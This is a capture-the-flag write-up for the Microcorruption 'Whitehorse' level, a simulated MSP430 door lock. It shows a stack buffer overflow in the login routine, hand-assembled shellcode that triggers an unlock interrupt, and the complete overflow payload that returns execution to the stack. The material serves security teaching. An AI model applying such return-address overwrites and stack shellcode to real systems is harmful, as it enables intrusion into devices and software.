# 07: Whitehorse

- _Points:_ 50 points
- _Version number_: c.01

## Password

```
30127f00b01232454141414141414141ae36
```

## Manual

```
Lockitall                                            LOCKIT PRO r c.01
______________________________________________________________________

              User Manual: Lockitall LockIT Pro, rev c.01
______________________________________________________________________


OVERVIEW

    - This lock is attached the the LockIT Pro HSM-2.
    - We have updated  the lock firmware to connect with this hardware
      security module.


DETAILS

    The LockIT Pro c.01  is the first of a new series  of locks. It is
    controlled by a  MSP430 microcontroller, and is  the most advanced
    MCU-controlled lock available on the  market. The MSP430 is a very
    low-power device which allows the LockIT  Pro to run in almost any
    environment.

    The  LockIT  Pro   contains  a  Bluetooth  chip   allowing  it  to
    communiciate with the  LockIT Pro App, allowing the  LockIT Pro to
    be inaccessable from the exterior of the building.

    There  is no  default  password  on the  LockIT  Pro HSM-2.   Upon
    receiving the  LockIT Pro,  a new  password must  be set  by first
    connecting the LockitPRO HSM to  output port two, connecting it to
    the LockIT Pro App, and entering a new password when prompted, and
    then restarting the LockIT Pro using the red button on the back.

    LockIT Pro Hardware  Security Module 2 stores  the login password,
    ensuring users  can not access  the password through  other means.
    The LockIT Pro  can send the LockIT Pro HSM-2  a password, and the
    HSM will  directly send the  correct unlock message to  the LockIT
    Pro Deadbolt  if the password  is correct, otherwise no  action is
    taken.

    This is Hardware  Version C.  It contains  the Bluetooth connector
    built in, and two available  ports: the LockIT Pro Deadbolt should
    be  connected to  port  1,  and the  LockIT  Pro  HSM-2 should  be
    connected to port 2.

    This is  Software Revision  01. The firmware  has been  updated to
    connect with the new hardware security module. We have removed the
    function to unlock the door from the LockIT Pro firmware.




(c) 2013 LOCKITALL                                            Page 1/1
```

## Writeup

In this version of the LockIT Pro firmware rev c.01, it claims it has been updated to remove the function to unlock the door from the firmware. This is likely in response to Level 05 (Reykjavik), where there were instructions in memory that allowed the deadbolt to be unlocked if a check was passed.

This time around, it seems that the password checking is done completely by the HSM itself, of which we are unable to inspect the program flow. However, we can still make use of the same `INT 0x7F` call to trigger a deadbolt unlock in the HSM, which allows us to bypass the password check.

To achieve this, let us look for our favourite buffer overflow vulnerability in `login`:

```
4508:  3e40 3000      mov   #0x30, r14
450c:  0f41           mov   sp, r15
450e:  b012 8645      call  #0x4586 <getsn>
```

We see that the `getsn` call accepts up to `0x30` bytes (48 bytes), whereas the buffer is only allocated 16 bytes. This allows us to write beyond the buffer at `36ae`-`36bd`. We also notice that at `36be`, it contains the return address for the `login` function to `443c`:

```
36a0:   4645 0000 9045 0200 ae36 3000 1245 4141   FE...E...60..EAA
36b0:   4141 0000 0000 0000 0000 0000 0000 3c44   AA............<D
```

We can overwrite the return address. However, there is no `unlock_door` function this time, so what we can do instead is to return to our own shellcode on the stack.

Let's use the assembler to assemble the following instructions into shellcode:

```
push #0x7f
call #0x4532
```

These instructions would first push `0x7f` on the stack, followed by calling the `INT` function. As mentioned in previous levels, this interrupt unlocks the deadbolt without checking for a password. We can assemble them into the following 8 bytes:

```
30127f00b0123245
```

Since we need to override the return address at bytes 17-18, we can return to `36ae`, the start of our buffer, and execute the above shellcode. Put together, we have the following payload:

```
30127f00b01232454141414141414141ae36
```
